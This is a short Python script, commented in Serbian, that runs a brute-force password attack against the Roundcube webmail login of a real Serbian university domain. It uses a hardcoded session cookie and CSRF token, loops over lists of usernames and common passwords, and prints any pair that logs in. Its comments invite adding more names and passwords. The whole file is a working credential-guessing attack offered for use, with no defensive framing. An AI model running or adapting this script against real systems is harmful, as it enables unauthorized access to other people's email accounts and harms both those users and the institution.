import requests

# URL na koji šalješ POST zahtev
url = 'https://webmail.kg.ac.rs/?_task=login'

# Cookie sesije
cookies = {
    'roundcube_sessid': 'b377c4k20go10imrf7ppc69oce'
}

# HTTP zaglavlja
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://webmail.kg.ac.rs',
    'Referer': 'https://webmail.kg.ac.rs/?_task=login',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Connection': 'keep-alive',
}

# Lista korisničkih imena i lozinki za brute force
usernames = ['stefan', 'marko', 'nikola']  # Dodaj više korisničkih imena
passwords = ['password123', '123456', 'stefan']  # Dodaj više lozinki

# Funkcija za brute force napad
def brute_force_login():
    session = requests.Session()  # Koristi sesiju kako bi zadržao kolačiće

    for username in usernames:
        for password in passwords:
            # Parametri POST zahteva (payload)
            data = {
                '_token': 'LFOSs6r5IfeTuaf0s84j3OjbtFzbOAK8',
                '_task': 'login',
                '_action': 'login',
                '_timezone': 'Europe/Belgrade',
                '_url': '_task=login',
                '_user': username,
                '_pass': password
            }

            response = session.post(url, headers=headers, cookies=cookies, data=data)

            # Provera da li je login uspešan
            if "Invalid username or password" not in response.text:
                print(f"[+] Successful login with: {username}:{password}")
                return
            else:
                print(f"[-] Failed login with: {username}:{password}")

# Pokreni brute force napad
brute_force_login()
